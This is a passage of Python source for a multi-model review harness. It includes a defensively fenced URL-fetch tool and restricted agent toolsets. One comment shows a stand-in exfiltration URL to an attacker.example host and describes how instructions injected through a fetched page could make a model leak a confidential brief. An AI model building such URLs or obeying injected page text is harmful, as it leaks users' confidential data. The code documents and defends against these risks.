        used = pri.get("usedPercent", pri.get("used_percent"))
        if used is None:
            return None
        mins = pri.get("windowDurationMins", pri.get("window_minutes")) or 0
        when = ""
        resets = pri.get("resetsAt", pri.get("resets_at"))
        if resets:
            try:
                when = ", resets " + datetime.datetime.fromtimestamp(
                    resets).isoformat(timespec="minutes")
            except (OverflowError, OSError, ValueError):
                pass
        creds = rl.get("credits") or {}
        has = creds.get("hasCredits", creds.get("has_credits"))

        # 🔴 A STALE SNAPSHOT IS ASYMMETRIC, AND THIS DISPLAY USED TO TREAT IT AS SYMMETRIC.
        # Accepted from three channels independently in the round-24 panel: telling an operator
        # they have headroom on a reading that may be hours old is worse than telling them
        # nothing, because "12% used" reads as permission while "100% used" reads as a warning.
        # Only one of those two errors costs money. So the number is SUPPRESSED when it would
        # grant confidence and kept when it would withhold it - the asymmetry is deliberate and
        # is the whole fix. This value never comes from a live call: it is whatever the last
        # codex invocation happened to record, and the maintainer states the real limits ride on
        # the HTTP headers of an actual request.
        # No age is shown, and that absence is itself measured rather than an oversight: the
        # app-server returns a snapshot with no timestamp in it, so "how old is this" is not
        # answerable from the data. Inventing a freshness indicator would be the same mistake in
        # a nicer font. What CAN be said honestly is where the number comes from.
        head = "subscription quota, from codex's own cached snapshot - not a live reading"
        if used >= 95:
            return ("%s: %.0f%% used of a %dh window%s (plan=%s, credits=%s)"
                    "  ⚠ WEEKLY LIMIT EXHAUSTED - this run will draw on credits. Consider "
                    "--skip codex, or switch channel. Never open a metered API path to route "
                    "around a subscription limit."
                    % (head, used, round(mins / 60.0), when,
                       rl.get("planType", rl.get("plan_type")), has))
        # Below the alarm line the exact percentage is withheld on purpose. A band plus the reset
        # time is everything an operator can act on; the decimal is precision this reading does
        # not have, and printing it manufactures a confidence the source cannot support.
        band = "under half" if used < 50 else "over half" if used < 80 else "most"
        return ("%s: %s of the %dh window used%s (plan=%s, credits=%s). The exact figure is not "
                "shown because it is a cached value and could be hours out of date - if the "
                "headroom matters, the only honest test is to run and watch."
                % (head, band, round(mins / 60.0), when,
                   rl.get("planType", rl.get("plan_type")), has))
    except Exception:
        return None
    finally:
        try:
            proc.kill()
        except Exception:
            pass


def call_codex(brief, marker, workdir, outfile, model=None, effort=None, system=None,
               timeout=None):
    """
    Prompt goes on STDIN and argv ends with "-". A positional prompt while something else pipes
    stdin makes it hang on 'Reading additional input from stdin...'.
    """
    binary = codex_bin()
    os.makedirs(workdir, exist_ok=True)
    # Injected per invocation instead of written into ~/.codex/config.toml, which is the user's
    # file and off limits. Verified 2026-07-26: the 15-element TOML array survives the Windows
    # command line intact and `codex mcp get firecrawl --json` reports all 15 back.
    deny = "mcp_servers.firecrawl.disabled_tools=[%s]" % ",".join(
        '"%s"' % t for t in FIRECRAWL_DENY)
    # Model override. 2026-07-26: off gpt-5.6-sol/max to gpt-5.4/xhigh (5.6 credits low).
    # 2026-07-30: Igor moved the channel to gpt-5.5/xhigh; probe confirmed the model exists
    # (low-effort "OK", 16,574 tok). Injected with -m / -c so ~/.codex/config.toml is never
    # edited: that file is his. Probe any unfamiliar model name cheaply before a real run.
    # Precedence: the resolved plan (registry + --route) beats the env var beats the default.
    # The env vars stay supported because existing project scripts set them inline.
    # 2026-08-02: значение переехало в channels.json (см. _registry_default выше). Литерал ниже
    # — аварийный запас на случай повреждённого реестра, а не источник истины.
    model = model or os.environ.get("CODEX_MODEL") or _registry_default("codex", "model", "gpt-5.4")
    effort = (effort or os.environ.get("CODEX_EFFORT")
              or _registry_default("codex", "effort", "xhigh"))
    cmd = [binary, "exec",
           "--sandbox", "read-only",
           "--skip-git-repo-check",          # -C often points outside a git repo
           "-C", workdir,
           "--color", "never",
           "-m", model,
           "-c", 'model_reasoning_effort="%s"' % effort,
           "-c", "tools.web_search=true",    # NOT --search: that flag does not exist and kills the launch
           "-c", deny,                       # Firecrawl credit policy; see FIRECRAWL_DENY above
           # 🔴 2026-08-07: THE "NO TELEMETRY" CLAIM WAS HALF FALSE, and the half that was false
           # is the half anyone asks about. This channel reports no TOOL telemetry - it never says
           # which pages it opened - and that got written down, in this file and in three others,
           # as "reports nothing at all". `codex exec --json` streams events to stdout, and the
           # closing `turn.completed` carries the full usage block. Igor, 2026-08-07: «можно даже
           # тупо посчитать самому, раз api (codex cli) не выдает такие данные» - he was right that
           # counting locally was possible, and the premise turned out not to need it. Estimating
           # what the vendor already reports is the expensive way to be approximately wrong.
           "--json",
           "-o", outfile,                    # read-only sandbox still writes the report through -o
           "-"]
    # 🔴 The progress stream goes to disk, so a killed run is not a total loss. See _run.
    # With --json this file is now the EVENT STREAM, which is strictly more recoverable than the
    # prose it replaced: `item.completed` carries the agent's message text, so a run killed after
    # its final message but before -o is flushed is no longer a total loss either.
    progress = os.path.join(os.path.dirname(outfile) or ".", "CODEX.progress.log")
    limit = _seconds(timeout, 3000)
    t0 = time.time()
    try:
        p, secs = _run(cmd, stdin_text=_with_system(brief, system), timeout=limit,
                       stdout_path=progress, env=_codex_env())
    except FileNotFoundError:
        return {"channel": "codex", "ok": False, "error": "binary not found: " + binary}
    except subprocess.TimeoutExpired:
        # 🔴 The elapsed time used to be dropped HERE, in the one branch that exists because
        # elapsed time ran out - so the run log printed "?s" and nobody could tell a 20-minute
        # cutoff from a 50-minute one. It also claimed "deep reviews run 25-35 min", implying it
        # needed longer, on a run that had been idle for 33 of its 50 minutes.
        waited = round(time.time() - t0, 1)
        why = codex_postmortem(started_after=t0)
        return {"channel": "codex", "ok": False, "seconds": waited,
                "model": model, "effort": effort, "progress_log": progress,
                "error": "killed after %.0fs (limit %ds). %s"
                         % (waited, limit, why or "no rollout found to explain it")}

    text = ""
    if os.path.exists(outfile):
        with open(outfile, encoding="utf-8", errors="replace") as f:
            text = f.read()
    warn = []
    # Codex emits partial output and keeps thinking. Exit code 0 does not mean finished.
    if marker and not text.strip().endswith(marker):
        warn.append("END MARKER NOT ON LAST LINE - output is partial, do not parse it")
    if not text.strip():
        warn.append("EMPTY OUTPUT (exit=%d) %s" % (p.returncode, (p.stderr or "")[:200]))
    note = []
    record_refusal(refusal_check(text, marker), warn, note)
    # 🔴 model/effort ВОЗВРАЩАЮТСЯ с 2026-08-02. До этого дня канал не сообщал, на чём он
    # отработал, и в АНАЛИТИКА.md колонка «усилие» у codex всегда стояла «—». Значит просьбу
    # «поменяй 5.5 на 5.4» нельзя было проверить по артефактам прогона — только чтением кода.
    # Настройка, которую невозможно наблюдать в выходе, неотличима от настройки, которая не
    # применилась: ровно так декоративная запись в channels.json и прожила незамеченной.
    out = {"channel": "codex", "ok": not warn, "text": text, "seconds": round(secs, 1),
           "bytes": len(text.encode("utf-8")), "exit": p.returncode, "warnings": warn,
           "notes": note, "model": model, "effort": effort}
    out.update(_parse_codex_events(progress))
    rl = codex_rate_limits(workdir, started_after=t0)
    if rl:
        out["rate_limit"] = rl
    return out


def hermes_bin():
    return _resolve_bin("HERMES_BIN", "hermes.exe",
                        [os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                      "hermes", "hermes-agent", "venv", "Scripts")])


# Toolsets handed to the Kimi channel. `web` and nothing else, on purpose: Hermes ships
# terminal, file, code_execution, browser and computer_use ENABLED by default, and a review
# channel's whole input is an untrusted brief. Granting those would turn a prompt into command
# execution on this machine. Verified against `hermes tools list` on 2026-08-01.
HERMES_TOOLSETS = "web"


def neutral_cwd():
    """A directory containing none of your files, for any channel that reads its own cwd.

    🔴 CONFIRMED LEAK, and `--ignore-rules` does NOT close it. That flag stops SOUL.md, AGENTS.md
    and Hermes's own memory; it does not stop the CLAUDE.md of the directory the CLI is launched
    from. Asked how it knew a line from a project instruction file, the model answered that the file
    had been "injected into my initial system context by the harness under a Project Context block",
    then quoted the sentence and located it correctly. The same probe from a scratch folder answered
    "NOTHING IN CONTEXT".

    It costs twice:
      INDEPENDENCE    - a reviewer that has read your own instructions is not a second opinion. In
                        one live run a channel cited the project's own instruction file back as
                        corroboration.
      CONFIDENTIALITY - that file reaches the vendor on EVERY call, outside the PII gate, which only
                        ever scanned the brief. This harness is run from project directories whose
                        CLAUDE.md names other repositories and, in at least one case, a live legal
                        matter.

    Every path this module passes to a subprocess is already absolute, so changing the child's cwd
    changes nothing else. `codex` gets `-C workdir` and `agy` gets `cwd=workdir` for their own
    reasons; `hermes` had neither and inherited whatever directory the operator happened to be in.
    """
    scratch = os.path.join(tempfile.gettempdir(), "orchestrate-neutral-cwd")
    os.makedirs(scratch, exist_ok=True)
    return scratch


def call_hermes(brief, marker, outfile, model=None, toolsets=None, system=None, timeout=2400):
    """
    Kimi K3 through the Hermes CLI. `-z/--oneshot` prints ONLY the final response text to
    stdout - no banner, no spinner, no tool previews - so stdout IS the review.

    Two traps, both measured 2026-08-01 rather than assumed:
      - the model id must be `moonshotai/kimi-k3`. Bare `kimi-k3` resolves to an unconfigured
        `kimi-coding` provider, and `kimi-k3-max` is not a valid id at all ("K3 Max" is a
        marketing variant name, not something the API accepts).
      - the prompt rides on argv, so it hits the same Windows command-line ceiling that bites
        agy. Same limit, same reason, so it reuses AGY_ARGV_LIMIT.
    """
    binary = hermes_bin()
    model = model or os.environ.get("HERMES_MODEL", "moonshotai/kimi-k3")
    payload = _with_system(brief, system)
    if len(payload) > AGY_ARGV_LIMIT:
        return {"channel": "kimi", "ok": False,
                "error": "prompt is %d chars; argv dies past ~%d on Windows"
                         % (len(payload), AGY_ARGV_LIMIT)}
    cmd = [binary, "-z", payload,
           "-m", model,
           "-t", toolsets or HERMES_TOOLSETS,
           # Do not inherit SOUL.md / AGENTS.md / Hermes memory: a reviewer that loads the
           # persona of the setup under review is not independent, and the injection makes the
           # run irreproducible. NEVER add --yolo here.
           "--ignore-rules"]
    try:
        # 🔴 cwd, not the operator's directory. See neutral_cwd(): --ignore-rules does not stop this
        # CLI injecting the launch directory's CLAUDE.md into the vendor's context, outside the gate.
        p, secs = _run(cmd, timeout=timeout, cwd=neutral_cwd())
    except FileNotFoundError:
        return {"channel": "kimi", "ok": False, "error": "binary not found: " + binary}
    except subprocess.TimeoutExpired:
        return {"channel": "kimi", "ok": False, "error": "timed out after %ss" % timeout}

    text = p.stdout or ""
    if outfile and text.strip():
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(text)
    warn = []
    # Hermes exits 0 on a provider error and prints the error as the "answer", so the exit code
    # proves nothing. These two strings are the observed shapes of that failure.
    low = text.lower()
    if "no usable credentials" in low or "is not a valid model id" in low:
        warn.append("PROVIDER/MODEL ERROR returned as prose: " + text.strip()[:160])
    if marker and not text.strip().endswith(marker):
        warn.append("END MARKER NOT ON LAST LINE - output is partial, do not parse it")
    if not text.strip():
        warn.append("EMPTY OUTPUT (exit=%d) %s" % (p.returncode, (p.stderr or "")[:200]))
    note = []
    record_refusal(refusal_check(text, marker), warn, note)
    return {"channel": "kimi", "ok": not warn, "text": text, "seconds": round(secs, 1),
            "bytes": len(text.encode("utf-8")), "exit": p.returncode,
            "model": model, "warnings": warn, "notes": note}


OPENROUTER_URL = os.environ.get("OPENROUTER_BASE",
                                "https://openrouter.ai/api/v1/chat/completions")

# 🔴 THREE VENDORS, ONE WIRE PROTOCOL - AND THE DIFFERENCES ARE DATA, NOT A SECOND FUNCTION.
#
# OpenRouter, Xiaomi MiMo and (nearly) everyone else speak OpenAI /chat/completions. The obvious
# way to add MiMo was to copy call_openrouter_reviewer and change three strings. That copy would
# have started life containing NONE of the four fixes this project paid for with real rounds -
# the per-CALL fetch ceiling (a budget checked per round let one turn spend 9 of 8), the
# already-tried-this-URL reply (one dead link ate three fetches), the blocked-HOST circuit breaker
# (uscis.gov 403 cost five fetches across two channels) and the budget-spent tool result (silently
# dropping a tool call yields an empty answer with no marker). Two homes for one loop is the rot
# this project keeps measuring; the vendor differences are small and enumerable, so they belong in
# a table.
#
# Every field here was established by PROBING the live endpoint on 2026-08-08, not by reading a
# doc - and that mattered, because both vendors return HTTP 200 for an invented top-level
# parameter. A status code proves nothing here; only a meter or the answer does.
OAI_PROVIDERS = {
    "openrouter": {
        "label": "OpenRouter",
        "url": OPENROUTER_URL,
        "key_env": "OPENROUTER_API_KEY",
        # Optional attribution headers. Static strings, no PII.
        "headers": {"HTTP-Referer": "https://github.com/igorsaevets/ai-second-opinion",
                    "X-Title": "model-orchestration"},
        "depth": "reasoning",        # body["reasoning"] = {"effort"|"max_tokens": ...}
        "search": "plugin",          # body["plugins"] = [{"id": "web", ...}], billed per search
        "usage_request": "openrouter",
    },
    "mimo": {
        "label": "Xiaomi MiMo",
        "url": os.environ.get("MIMO_BASE", "https://api.xiaomimimo.com/v1/chat/completions"),
        "key_env": "MIMO_API_KEY",
        "headers": {},
        # 🔴 THINKING IS OFF BY DEFAULT HERE, and the switch is `thinking: {"type": "enabled"}`.
        # MEASURED, four arms on the same puzzle: control 0 reasoning tokens, thinking=enabled 116,
        # thinking=disabled 0, enable_thinking=true 0. `enable_thinking` is one of the invented
        # parameters the endpoint silently accepts - it returns 200 and does nothing, which is
        # indistinguishable from working unless you read the meter.
        "depth": "thinking",
        # 🔴 THE VENDOR'S OWN FAQ NAMES THE WRONG SWITCH. mimo.mi.com documents
        # «only mimo-v2.5-pro and mimo-v2.5 supports online search ... enable via forced_search:
        # true». MEASURED: forced_search, enable_search, search, web_search and online_search all
        # return 200 and all leave the model answering NO_SEARCH. What actually works is the TOOL
        # form, tools:[{"type":"web_search"}] - 5 searches, 25 pages opened, 25 url_citation
        # annotations with title and summary, reported in usage.web_search_usage. The negative
        # control fired correctly here (web_search_ZZZ -> 400 "`function` is not set"), so the
        # tools array IS validated even though top-level parameters are not.
        "search": "native_tool",
        "search_tool": {"type": "web_search"},
        "usage_request": "openai",   # body["stream_options"] = {"include_usage": True}
    },
}


FETCH_TOOL_SCHEMA = {
    "type": "function",
    "function": {
        "name": "fetch_url",
        "description": (
            "Fetch the full text of a web page you have already found. Use this whenever you are "
            "about to QUOTE a source: search results are short query-selected excerpts with "
            "elisions, and a quotation assembled from them can splice two disjoint fragments "
            "into a sentence the page never contained. Fetch the page and quote from the fetched "
            "text. Returns plain text, truncated if very long."),
        "parameters": {
            "type": "object",
            "properties": {
                "url": {"type": "string",
                        "description": "Absolute http(s) URL of the page to fetch."}},
            "required": ["url"]},
    },
}

# Refuse anything that is not a public web page. The MODEL chooses this URL, and the brief it is
# reasoning about is untrusted text, so `fetch_url` is a server-side request forgery primitive
# pointed at the operator's own machine unless it is fenced. Blocked: non-http schemes (file://,
# gopher://), loopback, RFC1918, link-local (including 169.254.169.254, the cloud metadata
# endpoint), CGNAT, multicast and reserved ranges - checked AFTER DNS resolution and again after
# every redirect, because a public hostname can resolve to 127.0.0.1 and a public URL can redirect
# to one. This is the same lesson as the agy toolset fence: a review channel needs to read the
# public web and nothing else, and the restriction has to be mechanical.
FETCH_MAX_BYTES = 400_000
# Cumulative ceiling per channel per review, added 2026-08-08. See the `fetched_bytes` branch in
# call_oai_reviewer for the measurement that forced it: the per-CALL budget bounds the number of
# pages and not their size, and page text is re-sent on every subsequent tool round.
FETCH_RUN_BUDGET = 1_000_000
FETCH_MAX_REDIRECTS = 3


def _fetch_host(url):
    """Lower-cased hostname, or "" when the URL will not parse.

    Parsed with urlsplit rather than sliced out of the string. A substring test on a URL is the
    defect this project already measured at label-boundary level, where `.mil` matched inside
    `milano` and promoted a typosquat to an official source; the same shortcut here would retire
    the wrong host and silently stop a channel fetching something legitimate.
    """
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def _fetch_guard_host(host):
    """Return None if the host resolves only to public addresses, else the reason to refuse."""
    import ipaddress
    import socket
    if not host:
        return "no host in URL"
    try:
        infos = socket.getaddrinfo(host, None)
    except socket.gaierror as e:
        return "DNS failed: %s" % (e,)
    for info in infos:
        addr = info[4][0]
        try:
            ip = ipaddress.ip_address(addr.split("%")[0])   # strip IPv6 zone index
        except ValueError:
            return "unparseable address %r" % addr
        if (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast
                or ip.is_reserved or ip.is_unspecified):
            return ("%s resolves to %s, which is not a public address. This tool reaches the "
                    "public web only." % (host, ip))
    return None


def _safe_fetch_url(url, timeout=25):
    """Fetch a public web page as text, or return a string explaining why not.

    Never raises: a tool call that throws would abort a review that has already been paid for.
    The model is TOLD the failure, in words, and can decide to search again or say it could not
    open the page - which is exactly the behaviour the brief already asks for.
    """
    import html as _html
    seen = 0
    try:
        while True:
            parts = urllib.parse.urlsplit(url)
            if parts.scheme not in ("http", "https"):
                return "REFUSED: scheme %r is not allowed; only http and https." % parts.scheme
            # 🔴 THIS TOOL IS AN EXFILTRATION CHANNEL AND THE FENCE ABOVE DOES NOTHING ABOUT IT.
            # Raised independently by kimi and qwen reviewing this very change, both proposing the
            # same shape: `https://attacker.example/r?d=<base64 of the brief>`. That host is
            # public, so every check above passes it. The brief can be confidential, and the model
            # choosing the URL is reasoning about untrusted text that may carry injected
            # instructions - so this does not require a malicious model, only a poisoned page.
            # Not solvable here: a query string is how the legitimate web works. What IS done -
            # a length cap bounds how much can ride on one request, the fetch budget bounds the
            # number of requests, and EVERY fetched URL is printed to the console and recorded in
            # diagnostics.json, so the attempt is visible rather than silent. Residual risk,
            # accepted knowingly, not closed.
            if len(url) > 2000:
                return ("REFUSED: URL is %d characters. Real page URLs are short; a long one is "
                        "usually data being smuggled into a query string. Fetch the page, do not "
                        "encode content into the address." % len(url))
            bad = _fetch_guard_host(parts.hostname)
            if bad:
                return "REFUSED: " + bad
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (compatible; model-orchestration review harness)",
                "Accept": "text/html,application/xhtml+xml,text/plain,application/pdf;q=0.8"})
            opener = urllib.request.build_opener(_NoRedirect())
            try:
                resp = opener.open(req, timeout=timeout)
            except urllib.error.HTTPError as e:
                if e.code in (301, 302, 303, 307, 308) and seen < FETCH_MAX_REDIRECTS:
                    nxt = e.headers.get("Location")
                    if not nxt:
                        return "HTTP %s with no Location header." % e.code
                    url = urllib.parse.urljoin(url, nxt)   # re-guarded at the top of the loop
                    seen += 1
                    continue
                return "HTTP %s fetching %s" % (e.code, url)
            with resp:
                ctype = (resp.headers.get("Content-Type") or "").lower()
                raw = resp.read(FETCH_MAX_BYTES + 1)
            break
    except Exception as e:
        return "could not fetch %s: %r" % (url, e)
    truncated = len(raw) > FETCH_MAX_BYTES
    raw = raw[:FETCH_MAX_BYTES]
    if "application/pdf" in ctype or raw[:5] == b"%PDF-":
        return ("REFUSED: %s is a PDF. This tool returns text only - cite it as [SNIPPET] or "
                "find an HTML rendering." % url)
    body = raw.decode("utf-8", "replace")
    if "html" in ctype or body.lstrip()[:1] == "<":
        body = re.sub(r"(?is)<(script|style|noscript|svg)\b.*?</\1>", " ", body)
        body = re.sub(r"(?s)<!--.*?-->", " ", body)
        body = re.sub(r"(?s)<[^>]+>", " ", body)
        body = _html.unescape(body)
    body = re.sub(r"[ \t\r\f\v]+", " ", body)
    body = re.sub(r"\n\s*\n\s*\n+", "\n\n", body).strip()
    if truncated:
        body += "\n\n[TRUNCATED at %d bytes - fetch a more specific URL if you need the rest]" \
                % FETCH_MAX_BYTES
    return body or "(the page returned no readable text)"


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Turn redirects into HTTPError so _safe_fetch_url re-guards every hop itself."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


# =============================================================================================
# ONE VOCABULARY FOR "WHICH PAGES WERE READ"  (defect D6, raised by 4 of 8 reviewers in round 28)
# =============================================================================================
#
# 🔴 THE FIELD `opened_urls` MEANT TWO DIFFERENT THINGS AND THE WEAKER ONE BORROWED THE
# STRONGER ONE'S CREDIBILITY. On the openrouter/oai channels it counted pages THIS HARNESS
# fetched - we hold the bytes, we can re-read them, we can prove the quotation. On the xai and
# gemini channels the same key counted pages the VENDOR says it opened, which nothing here can
# check. Every comparison across channels, every report column, and `n_grounded` itself treated
# the two as one quantity. Codex put it best in its round-28 review: the field "cannot honestly
# mean both «we hold the bytes» and «the vendor asserts it read this»".
#
# This is the same disease as calling a printed-URL count "grounding", which this project caught
# itself doing in the krokai toolkit - and it is the reason for the house rule that a counter is
# named for what it COUNTS, never for what it is being used to argue.
#
# The vocabulary, used by every channel that returns any of it:
#
#   fetched_by_us / fetched_urls   pages the harness fetched. Evidence.
#   vendor_opened / vendor_opened_urls
#                                  pages the vendor reports opening. An assertion, and a
#                                  structured one - better than a bare URL in prose, weaker
#                                  than bytes on our disk.
#   n_grounded                     citations backed by fetched_urls. None when we fetched none,
#                                  never 0-vs-None ambiguity dressed up as a measurement.
#   n_vendor_grounded              citations backed by vendor_opened_urls.
#   grounding_basis                harness | vendor | both | none - so a downstream reader who
#                                  never opens this file still cannot mistake one for the other.
def _grounding(fetched=(), vendor_opened=()):
    """The five grounding fields, computed once so no channel can invent a sixth spelling."""
    f = sorted(set(fetched or ()))
    v = sorted(set(vendor_opened or ()))
    basis = "both" if (f and v) else "harness" if f else "vendor" if v else "none"
    return {"fetched_by_us": len(f), "fetched_urls": f,
            "vendor_opened": len(v) or None, "vendor_opened_urls": v or None,
            "grounding_basis": basis}


GEMINI_URL = "https://generativelanguage.googleapis.com/v1beta/interactions"


def call_gemini_direct(brief, marker, outfile, model=None, system=None, timeout=2400,
                       name="gemini36flash", tools=None, max_tokens=None, thinking_level=None):
    """Gemini on Google's OWN Interactions API - the third way to reach this family.

    Why a third Gemini transport is not redundancy. Round 26 measured `agy36flash` and
    `orgemini36flash` on the IDENTICAL model id and found the transport, not the model, decided
    the grounding: agy read `uscis.gov/policy-manual/volume-7-part-b-chapter-4` in 1.12 s, the
    exact URL our own fetcher was refused with HTTP 403 three times. That raised a question the
    pair could not answer - is the advantage Google's INFRASTRUCTURE or Antigravity's agent
    harness? This channel answers it: same model, Google's own API, our brief.

    🔴 PROBED 2026-08-07 AND IT IS THE INFRASTRUCTURE. `tools:[{"type":"url_context"}]` opened
    that same USCIS page and returned three `url_citation` annotations pointing at it. So the
    reach comes with Google's own retrieval stack and is available on a plain API key - it is not
    a property of the subscription CLI.

    Two capabilities here exist nowhere else in the panel:

    * **Citations carry CHARACTER SPANS.** Every `url_citation` annotation has `start_index` and
      `end_index` into the answer text, so "which sentence does this source actually support" is
      mechanical rather than a judgement. Every other channel makes us infer it.
    * **`url_context` is Google's retrieval, not ours** - an internal index cache with a live
      fetch fallback, 20 URLs per request, 34 MB per URL, and PDFs. It also refuses localhost and
      private ranges *at their end*, so on this channel the SSRF fence is Google's, not
      `_safe_fetch_url`'s. That is a genuine reduction in our attack surface and it is also the
      reason the harness's own fetch tool is NOT offered here: two fetchers would make
      "who opened this page" ambiguous, which is the one thing this channel is best at.

    🔴 THE TRAP, MEASURED: `google_search` citations come back as
    `vertexaisearch.cloud.google.com/grounding-api-redirect/...` - opaque redirect wrappers, NOT
    the publisher's URL. `url_context` citations are the real URL. So a citation audit on this
    channel must treat the two annotation sources differently, and a redirect URL that resolves
    LIVE proves only that Google's redirector is up.

    Wire shape, established by probing because the docs show only the happy path: the system
    prompt is `system_instruction` (`instructions`, `system` and `developer_instruction` are all
    HTTP 400); the output ceiling is `generation_config.max_output_tokens` (a bare
    `max_output_tokens` is 400).

    🔴🔴 THE DEPTH KNOB EXISTS, AND THIS DOCSTRING SAID IT DID NOT (corrected 2026-08-08).
    It used to end "There is no effort or thinking knob at all - `thinking_level`,
    `thinking_config` and `reasoning_effort` are each rejected outright". The 2026-08-07 probe
    that produced that sentence sent `thinking_level` at the TOP LEVEL, got
    `400 Unknown parameter 'thinking_level'`, and read a wrong-nesting error as a missing
    feature. Google's docs put it in `generation_config`, and re-probing there settles it by
    METER, not by status code: no knob -> 391 thought tokens, `minimal` -> 0, `high` -> 306.
    Both negative controls fire - a bad value returns 400 naming the enum
    (minimal|low|medium|high), a bad key returns 400 naming the field - so unlike MiMo and xAI
    this endpoint validates what it is sent, and a 200 here is worth something.

    The general lesson, which is why this paragraph is long: a 400 answers "not like that",
    never "not at all". Concluding absence from one rejected placement is how a real capability
    stays switched off for a year.
    """
    key = os.environ.get("GEMINI_API_KEY")
    if not key and os.name == "nt":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment") as reg:
                key = winreg.QueryValueEx(reg, "GEMINI_API_KEY")[0]
        except OSError:
            pass
    if not key:
        return {"channel": name, "ok": False,
                "error": "GEMINI_API_KEY is not set - this channel needs it. Set it (see "
                         "INSTALL.md), or run with --skip %s." % name}
    model = model or _registry_default(name, "model", "gemini-3.6-flash")
    tool_list = [{"type": t} for t in (tools or ["google_search", "url_context"])]
    gen = {"max_output_tokens": max_tokens or 60000}
    lvl = thinking_level or _registry_default(name, "thinking_level", None)
    if lvl:
        gen["thinking_level"] = lvl
    body = {"model": model, "input": brief, "generation_config": gen, "tools": tool_list}
    if system:
        body["system_instruction"] = system
    log("  [%s] tools=%s | thinking_level=%s (Google's own retrieval - no harness fetch tool on "
        "this channel)" % (name, ",".join(t["type"] for t in tool_list),
                           lvl or "unset (vendor default: medium)"))

    t0 = time.time()
    try:
        rq = urllib.request.Request(GEMINI_URL, data=json.dumps(body).encode("utf-8"),
                                    headers={"x-goog-api-key": key,
                                             "Content-Type": "application/json"})
        with urllib.request.urlopen(rq, timeout=timeout) as resp:
            data = json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        detail = e.read().decode("utf-8", "replace")[:400]
        return {"channel": name, "ok": False, "seconds": round(time.time() - t0, 1),
                "error": "HTTP %d: %s" % (e.code, detail)}
    except Exception as e:
        return {"channel": name, "ok": False, "seconds": round(time.time() - t0, 1),
                "error": "transport: %r" % (e,)}
    secs = time.time() - t0

    parts, cites, queries, opened, redirect_cites = [], [], [], [], 0
    for step in data.get("steps") or []:
        st = step.get("type")
        if st == "google_search_call":
            queries += list((step.get("arguments") or {}).get("queries") or [])
        elif st == "url_context_result":
            # Google reports each retrieval attempt here; `status` is the honest signal.
            for r in (step.get("result") or []) if isinstance(step.get("result"), list) else []:
                if isinstance(r, dict) and r.get("retrieved_url"):
                    opened.append(r["retrieved_url"])
        elif st == "model_output":
            for cb in step.get("content") or []:
                if cb.get("type") == "text":
                    parts.append(cb.get("text") or "")
                for a in cb.get("annotations") or []:
                    u = a.get("url")
                    if not u:
                        continue
                    if "grounding-api-redirect" in u:
                        redirect_cites += 1     # opaque: proves nothing about the publisher
                    else:
                        cites.append(u)
                        opened.append(u)        # url_context citations ARE the page it read
    text = "\n\n".join(p for p in parts if p).strip()
    try:
        with open(outfile, "w", encoding="utf-8") as f:
            f.write(text)
    except OSError as exc:
        log("  [%s] could not write %s (%s)" % (name, outfile, exc))

    u = data.get("usage") or {}
    warn, note = [], []
    if marker and marker not in text:
        warn.append("END MARKER ABSENT - output is incomplete, do not parse it as a finished review")
    if not text:
        warn.append("EMPTY ANSWER despite a successful call")
    if data.get("status") and data["status"] != "completed":
        warn.append("status=%s (not 'completed')" % data["status"])
    record_refusal(refusal_check(text, marker), warn, note)
    if redirect_cites and not cites:
        note.append("All %d citations are vertexaisearch grounding-api-redirect wrappers, not "
                    "publisher URLs. They came from google_search, not from a page this channel "
                    "opened - resolving one proves Google's redirector is up and nothing else. "
                    "Ask for url_context when you need an auditable source." % redirect_cites)
    opened = sorted(set(_norm_url(u2) for u2 in opened))
    return {"channel": name, "ok": not warn, "text": text, "seconds": round(secs, 1),
            "bytes": len(text.encode("utf-8")), "model": data.get("model") or model,
            "in_tokens": u.get("total_input_tokens"),
            "cached_in_tokens": u.get("total_cached_tokens"),
            "in_tokens_total": u.get("total_input_tokens"),
            "cache_convention": "subset (total_input_tokens already contains "
                                "total_cached_tokens); Google reports both plus "
                                "total_tool_use_tokens for retrieved page content",
            "out_tokens": u.get("total_output_tokens"),
            "reasoning_tokens": u.get("total_thought_tokens"),
            "tool_tokens": u.get("total_tool_use_tokens"),
            "searches": len(queries), "tool_calls": len(queries) + len(opened),
            # 🔴 D6, FIXED 2026-08-08. These two lines used to read
            #     "opened_urls": len(opened), "fetched_urls": opened,
            # on a channel where WE FETCH NOTHING. `opened` here is what GOOGLE retrieved through
            # url_context; a field called `fetched_urls` on it asserted we held bytes we never
            # had, and `opened_urls` meant our own fetches on the OpenRouter/MiMo channels and
            # the vendor's on this one and on xai. One name, two meanings, and the weaker one
            # inherited the stronger one's credibility every time the two were compared.
            # See _grounding() for the vocabulary.
            **_grounding(fetched=[], vendor_opened=opened),
            "n_cited": len(cites) + redirect_cites,
            "n_vendor_grounded": len(cites),
            "redirect_citations": redirect_cites,
            "warnings": warn, "notes": note}


def call_oai_reviewer(brief, marker, outfile, model=None, system=None, timeout=2400,
                      web=None, name="kimi", reasoning=None, max_tokens=None,
                      fetch_tool=None, provider="openrouter"):
    """
    Any OpenAI-protocol model over /chat/completions, DIRECTLY - no CLI in between.

    RENAMED from call_openrouter_reviewer on 2026-08-08, when MiMo arrived on a direct key. It is
    the same rename this function already went through once (call_kimi_openrouter -> ...) and for
    the same reason: a function named for ONE of the several things it serves is the
    instance-for-class mistake that left `channels.spark.model` decorative and kept the reporting
    layer testing `name == "kimi"`. The vendor now comes from OAI_PROVIDERS, keyed on `provider`,
    and an unknown provider is a hard error rather than a silent fall-back to OpenRouter - because
    falling back would send a brief, and the bill, to the wrong vendor while printing the right
    channel name.

    Renamed from `call_kimi_openrouter` on 2026-08-06 when Qwen joined: a function named for one
    of the several channels it serves is the same instance-not-class mistake that left
    `channels.spark.model` decorative for weeks, and it is the reason the reporting layer was
    still testing `name == "kimi"` long after that stopped meaning "the OpenRouter channel".

    Why Hermes was demoted (all of this measured 2026-08-03, none of it recalled): Hermes
    routes `moonshotai/*` through OpenRouter with the SAME OPENROUTER_API_KEY that sits in this
    machine's environment - its own config.yaml names that variable and it keeps
